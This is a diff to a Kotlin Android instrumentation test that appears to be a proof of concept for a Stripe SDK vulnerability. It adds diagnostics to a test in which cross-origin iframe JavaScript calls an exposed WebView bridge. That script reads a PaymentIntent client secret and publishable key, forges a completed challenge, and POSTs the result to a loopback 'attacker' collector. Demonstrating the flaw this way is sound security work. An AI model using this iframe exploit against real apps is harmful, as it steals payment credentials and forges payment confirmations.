@@ -1,15 +1,24 @@
 package com.stripe.android.challenge.confirmation
 
 import android.net.Uri
+import android.net.http.NetworkSecurityPolicy
+import android.webkit.ConsoleMessage
+import android.webkit.WebChromeClient
+import android.webkit.WebResourceError
+import android.webkit.WebResourceRequest
+import android.webkit.WebResourceResponse
+import android.webkit.WebView
+import android.webkit.WebViewClient
 import androidx.test.core.app.ActivityScenario
 import androidx.test.ext.junit.runners.AndroidJUnit4
 import androidx.test.platform.app.InstrumentationRegistry
 import com.google.common.truth.Truth.assertThat
+import com.google.common.truth.Truth.assertWithMessage
 import com.stripe.android.TestActivity
 import com.stripe.android.core.ApiConfiguration
 import com.stripe.android.core.Logger
-import com.stripe.android.testing.PaymentIntentFactory
 import com.stripe.android.testing.FakeErrorReporter
+import com.stripe.android.testing.PaymentIntentFactory
 import java.io.Closeable
 import java.net.InetAddress
 import java.net.ServerSocket
@@ -30,18 +39,15 @@ import org.junit.runner.RunWith
  * [IntentConfirmationChallengeWebView] is reachable from JavaScript running
  * in a CROSS-ORIGIN iframe loaded inside the WebView, with no origin
  * validation anywhere in the component, and it hands that frame:
- *   - the live PaymentIntent/SetupIntent client secret + publishable key
+ *   - the PaymentIntent/SetupIntent client secret + publishable key
  *     via getInitParams()
  *   - the ability to forge a completed-challenge result via onSuccess()
  *
- * Unlike the Robolectric unit PoC (which exercises the same wiring on the
- * JVM), this test runs on a real Android emulator WebView:
- *   - origin A (parent page) is served from 127.0.0.1:<portA>
- *   - origin B (attacker frame) is served from 127.0.0.1:<portB>
- *     (different port => different origin, enforced by the browser)
+ * Setup on a real Android emulator WebView:
+ *   - origin A (parent page): 127.0.0.1:<portA>
+ *   - origin B (attacker frame): 127.0.0.1:<portB>  (different port => origin)
  *   - the iframe's OWN JavaScript calls Android.getInitParams() and
- *     Android.onSuccess(...) and exfiltrates the result to origin B's
- *     collector endpoint, which the test asserts on.
+ *     Android.onSuccess(...) and POSTs the result to origin B's collector.
  *
  * No code in this test calls the bridge methods directly - only the
  * iframe's JavaScript does, on a real WebView.
@@ -62,6 +68,8 @@ internal class IntentConfirmationChallengeRealWebViewPoCTest {
     private val frameCollector = BodyCollector()
     private val mainCollector = BodyCollector()
     private val openedUris = Collections.synchronizedList(mutableListOf<Uri>())
+    private val consoleMessages = Collections.synchronizedList(mutableListOf<String>())
+    private val pageEvents = Collections.synchronizedList(mutableListOf<String>())
 
     private fun createHandler(): DefaultConfirmationChallengeBridgeHandler {
         val args = IntentConfirmationChallengeArgs(
@@ -86,8 +94,7 @@ internal class IntentConfirmationChallengeRealWebViewPoCTest {
 
     @Test
     fun crossOriginIframeJavaScriptReceivesClientSecretAndForgesSuccess() {
-        // ---- origin B: attacker frame server ----
-        frameServer = MiniServer { method, path, body ->
+        frameServer = MiniServer("B") { method, path, body ->
             when {
                 method == "POST" && path == "/collect-frame" -> {
                     frameCollector.add(body.orEmpty())
@@ -97,9 +104,7 @@ internal class IntentConfirmationChallengeRealWebViewPoCTest {
                 else -> 404 to "not found"
             }
         }
-
-        // ---- origin A: parent page server ----
-        parentServer = MiniServer { method, path, body ->
+        parentServer = MiniServer("A") { method, path, body ->
             when {
                 method == "POST" && path == "/collect-main" -> {
                     mainCollector.add(body.orEmpty())
@@ -112,32 +117,94 @@ internal class IntentConfirmationChallengeRealWebViewPoCTest {
 
         val parentUrl = "http://127.0.0.1:${parentServer.port}/"
         val handler = createHandler()
+        val cleartextAllowed = NetworkSecurityPolicy.getInstance().isCleartextTrafficPermitted()
 
         ActivityScenario.launch(TestActivity::class.java).use { scenario ->
-            var webView: IntentConfirmationChallengeWebView? = null
+            var webView: WebView? = null
 
             scenario.onActivity { activity ->
                 val wv = IntentConfirmationChallengeWebView(activity)
                 webView = wv
                 wv.addBridgeHandler(handler)
-                wv.webViewClient = IntentConfirmationWebViewClient(
+
+                // Production WebViewClient, wrapped only to observe page lifecycle
+                // and errors for diagnostics; all navigation decisions still go
+                // through the production implementation.
+                val productionClient = IntentConfirmationWebViewClient(
                     hostUrl = parentUrl,
                     errorHandler = {},
                     logger = Logger.getInstance(enableLogging = false),
                     openUri = { uri -> openedUris.add(uri) },
                 )
+                wv.webViewClient = object : WebViewClient() {
+                    override fun shouldOverrideUrlLoading(view: WebView?, request: WebResourceRequest?): Boolean =
+                        productionClient.shouldOverrideUrlLoading(view, request)
+
+                    override fun onPageFinished(view: WebView?, url: String?) {
+                        pageEvents.add("finished: $url")
+                    }
+
+                    override fun onReceivedError(
+                        view: WebView?,
+                        request: WebResourceRequest?,
+                        error: WebResourceError?,
+                    ) {
+                        pageEvents.add(
+                            "error: ${request?.url} -> ${error?.errorCode} ${error?.description}",
+                        )
+                        productionClient.onReceivedError(view, request, error)
+                    }
+
+                    override fun onReceivedHttpError(
+                        view: WebView?,
+                        request: WebResourceRequest?,
+                        errorResponse: WebResourceResponse?,
+                    ) {
+                        pageEvents.add(
+                            "httpError: ${request?.url} -> ${errorResponse?.statusCode}",
+                        )
+                        productionClient.onReceivedHttpError(view, request, errorResponse)
+                    }
+                }
+                wv.webChromeClient = object : WebChromeClient() {
+                    override fun onConsoleMessage(consoleMessage: ConsoleMessage?): Boolean {
+                        consoleMessages.add(
+                            "${consoleMessage?.messageLevel()}: ${consoleMessage?.message()}",
+                        )
+                        return false
+                    }
+                }
                 activity.setContentView(wv)
                 wv.loadUrl(parentUrl)
             }
 
-            // The iframe's JS exfiltrates to origin B's collector.
-            val frameBodies = frameCollector.awaitAll(2, timeoutSeconds = 45)
-            assertThat(frameBodies).isNotEmpty()
+            val frameBodies = frameCollector.awaitAll(1, timeoutSeconds = 45)
+            val mainBodies = mainCollector.awaitAll(1, timeoutSeconds = 5)
+            val finalUrl = runOnUiThread { webView?.url }
+
+            val diagnostics = buildString {
+                append("cleartextAllowed=").append(cleartextAllowed)
+                append(" | parentServer=127.0.0.1:").append(parentServer.port)
+                append(", hits=").append(parentServer.requestLog())
+                append(" | frameServer=127.0.0.1:").append(frameServer.port)
+                append(", hits=").append(frameServer.requestLog())
+                append(" | pageEvents=").append(pageEvents)
+                append(" | console=").append(consoleMessages)
+                append(" | openedUris=").append(openedUris)
+                append(" | webView.url=").append(finalUrl)
+                append(" | mainBodies=").append(mainBodies)
+                append(" | frameBodies=").append(frameBodies)
+            }
+            println("[PoC-DIAG] $diagnostics")
+
+            assertWithMessage("iframe collector empty - full diagnostics: $diagnostics")
+                .that(frameBodies)
+                .isNotEmpty()
 
             val frameReport = JSONObject(frameBodies.first())
             val origin = frameReport.getString("origin")
 
-            // 1. The report came from a genuinely DIFFERENT origin than the parent page.
+            // 1. Genuinely a different origin than the parent page.
             assertThat(origin).isEqualTo("http://127.0.0.1:${frameServer.port}")
             assertThat(frameServer.port).isNotEqualTo(parentServer.port)
 
@@ -158,18 +225,24 @@ internal class IntentConfirmationChallengeRealWebViewPoCTest {
             } as ConfirmationChallengeBridgeEvent.Success
             assertThat(successEvent.clientSecret).isEqualTo(forgedClientSecret)
 
-            // 5. Control: the MAIN frame also has the interface (platform behavior).
-            val mainBodies = mainCollector.awaitAll(1, timeoutSeconds = 30)
-            if (mainBodies.isNotEmpty()) {
-                val mainReport = JSONObject(mainBodies.first())
-                assertThat(mainReport.getBoolean("hasAndroid")).isTrue()
-            }
+            // 5. Control: the MAIN frame also has the interface.
+            assertThat(mainBodies).isNotEmpty()
+            val mainReport = JSONObject(mainBodies.first())
+            assertThat(mainReport.getBoolean("hasAndroid")).isTrue()
 
-            // 6. Production WebViewClient: nothing was kicked out to an external
-            //    browser during this flow - the iframe content never even needed
-            //    a main-frame navigation to reach the bridge.
+            // 6. No main-frame navigation was kicked out to an external browser;
+            //    the iframe content reached the bridge with zero navigation.
             assertThat(openedUris).isEmpty()
+
+            println("[PoC] PASS: cross-origin iframe JS read the client secret and forged onSuccess")
         }
+    }
+
+    private fun <T> runOnUiThread(block: () -> T): T {
+        var result: T? = null
+        instrumentation.runOnMainSync { result = block() }
+        @Suppress("UNCHECKED_CAST")
+        return result as T
     }
 
     private fun buildParentHtml(framePort: Int): String = """
@@ -181,7 +254,7 @@ internal class IntentConfirmationChallengeRealWebViewPoCTest {
             frame: 'main',
             origin: location.origin,
             hasAndroid: typeof Android !== 'undefined'
-          })});
+          })}).catch(function (e) { console.log('main fetch failed: ' + e); });
         </script>
         <iframe src="http://127.0.0.1:$framePort/frame.html" width="320" height="240"></iframe>
         </body></html>
@@ -206,12 +279,14 @@ internal class IntentConfirmationChallengeRealWebViewPoCTest {
           } catch (e) {
             out.error = String(e);
           }
-          await fetch('/collect-frame', {method: 'POST', body: JSON.stringify(out)});
+          try {
+            await fetch('/collect-frame', {method: 'POST', body: JSON.stringify(out)});
+          } catch (e) {
+            console.log('iframe collect failed: ' + e);
+          }
         })();
         </script></body></html>
     """.trimIndent()
-
-    // ---- minimal loopback HTTP server (two ports => two origins) ----
 
     private class BodyCollector {
         private val bodies = Collections.synchronizedList(mutableListOf<String>())
@@ -223,7 +298,9 @@ internal class IntentConfirmationChallengeRealWebViewPoCTest {
         }
 
         fun awaitAll(minCount: Int, timeoutSeconds: Long): List<String> {
-            latch.await(timeoutSeconds, TimeUnit.SECONDS)
+            if (bodies.size < minCount) {
+                latch.await(timeoutSeconds, TimeUnit.SECONDS)
+            }
             val deadline = System.currentTimeMillis() + 1_000
             while (bodies.size < minCount && System.currentTimeMillis() < deadline) {
                 Thread.sleep(50)
@@ -233,10 +310,14 @@ internal class IntentConfirmationChallengeRealWebViewPoCTest {
     }
 
     private class MiniServer(
+        private val name: String,
         private val handler: (method: String, path: String, body: String?) -> Pair<Int, String>,
     ) : Closeable {
         private val socket = ServerSocket(0, 50, InetAddress.getByName("127.0.0.1"))
         val port: Int get() = socket.localPort
+        private val log = Collections.synchronizedList(mutableListOf<String>())
+
+        fun requestLog(): List<String> = synchronized(log) { log.toList() }
 
         private val thread = Thread {
             while (!socket.isClosed) {
@@ -247,6 +328,7 @@ internal class IntentConfirmationChallengeRealWebViewPoCTest {
                         val parts = requestLine.split(" ")
                         val method = parts.getOrElse(0) { "GET" }
                         val path = parts.getOrNull(1)?.substringBefore("?") ?: "/"
+                        log.add("$name $method $path")
                         var contentLength = 0
                         while (true) {
                             val line = input.readLine() ?: break
